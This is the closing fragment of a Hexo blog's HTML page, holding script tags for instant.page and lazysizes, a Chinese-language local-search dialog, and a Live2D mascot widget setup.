})</script><script src="https://cdn.jsdelivr.net/npm/instant.page@latest/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/lazysizes@latest/lazysizes.min.js" async=""></script><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章"></div></div></div><hr><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>由</span> <a href="https://github.com/wzpan/hexo-generator-search" target="_blank" rel="noopener" style="color:#49B1F5;">hexo-generator-search</a>
 <span>提供支持</span></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div><script src="/yakko1216.github.io/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/yakko1216.github.io/live2dw/assets/assets/shizuku.model.json"},"display":{"position":"right","hOffset":60,"vOffset":-20,"width":90,"height":180},"mobile":{"show":false},"log":false});</script></body></html>